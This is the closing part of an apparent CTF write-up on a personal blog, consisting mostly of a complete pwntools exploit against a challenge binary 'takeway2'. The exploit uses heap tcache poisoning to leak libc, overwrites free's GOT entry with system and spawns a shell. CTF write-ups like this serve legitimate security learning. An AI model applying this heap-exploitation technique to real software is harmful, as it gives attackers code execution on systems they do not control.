<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_got-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,p64(system))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./takeway2&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;101.200.234.115&#x27;</span>,<span class="number">43668</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./takeway2&#x27;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,name,remark</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input your order index&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input your food name: &#x27;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a remark: &#x27;</span>)</span><br><span class="line">p.send(remark)<span class="comment">#second 8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input your order index&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,name</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;New food name is: &#x27;</span>)</span><br><span class="line">p.send(name)<span class="comment">#first 8</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x0404088</span>-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>,p64(<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x404030</span> - <span class="number">8</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Please input index: &quot;</span>, <span class="built_in">str</span>(<span class="number">8</span>).encode())</span><br><span class="line">setbuf_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;setbuf&#x27;</span>,setbuf_addr)</span><br><span class="line">libc_base=setbuf_addr-libc.dump(<span class="string">&#x27;setbuf&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;New food name is: &quot;</span>, p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_got-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,p64(system))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/08/28/NSSCTF%202nd%20Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">NSSCTF 2nd Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/08/28/%E8%87%B4%E4%B8%80%E5%B9%B4%E5%89%8D%E7%9A%84%E8%87%AA%E5%B7%B1%E3%80%82/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">致一年前的自己。</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>